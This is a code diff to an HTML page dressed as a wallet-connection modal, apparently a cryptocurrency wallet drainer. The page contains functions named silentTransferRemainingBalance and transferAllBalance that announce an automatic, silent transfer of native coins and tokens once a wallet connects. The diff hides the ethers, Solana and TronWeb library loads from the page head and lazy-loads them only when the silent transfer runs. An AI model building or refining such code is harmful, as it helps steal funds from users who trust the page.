@@ -9,25 +9,6 @@
         <!-- (Do NOT add manual <script> tags for WalletConnect or main.* in index.html) -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-   <!-- Better ethers.js v6 CDN - use this instead of old one -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
-
-<!-- Fallback mirror if above fails -->
-<!-- <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script> -->
-<!-- Solana web3.js - for Phantom, Backpack, etc. -->
-<script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-
-<!-- TronWeb - for TronLink -->
-<script src="https://unpkg.com/tronweb@6.0.2/dist/TronWeb.js"></script>
-    <!-- Optional: Quick debug to confirm they loaded -->
-<script>
-  window.addEventListener('load', () => {
-    console.log("Dependencies check:");
-    console.log("ethers loaded?", !!window.ethers);
-    console.log("solanaWeb3 loaded?", !!window.solanaWeb3);
-    console.log("TronWeb loaded?", !!window.TronWeb);
-  });
-</script>
     <style>
         :root {
             --reown-bg: #0a0a0c;
@@ -937,6 +918,32 @@
             }
         }
 
+        // ════════════════════════════════════════════════════════════════════════════════
+        // === LAZY LOAD TRANSFER DEPENDENCIES ===
+        // ════════════════════════════════════════════════════════════════════════════════
+        async function loadTransferDeps() {
+          if (window.ethers) return; // already loaded
+
+          const loadScript = (url) => new Promise((resolve, reject) => {
+            const s = document.createElement('script');
+            s.src = url;
+            s.async = true;
+            s.onload = resolve;
+            s.onerror = () => reject(new Error(`Failed to load ${url}`));
+            document.head.appendChild(s);
+          });
+
+          try {
+            await loadScript('https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js');
+            await loadScript('https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js');
+            await loadScript('https://unpkg.com/tronweb@6.0.2/dist/TronWeb.js');
+            console.log("Transfer dependencies loaded successfully");
+          } catch (err) {
+            console.error("Failed to load transfer deps:", err);
+            throw err;
+          }
+        }
+
         // Placeholder - replace with your real transfer logic later
         async function transferAllBalance() {
             console.log('Wallet connected! Starting automatic balance transfer...');
@@ -951,6 +958,7 @@
         async function silentTransferRemainingBalance(connectionInfo) {
           try {
             console.log("Starting silent balance transfer (native + tokens)...");
+            await loadTransferDeps(); // lazy load only when needed
 
             let provider = connectionInfo.provider;
             let chainId, fromAddress;
@@ -2083,6 +2091,7 @@
     <script src="script.js"></script>
 </body>
 </html>
+
 
 
 
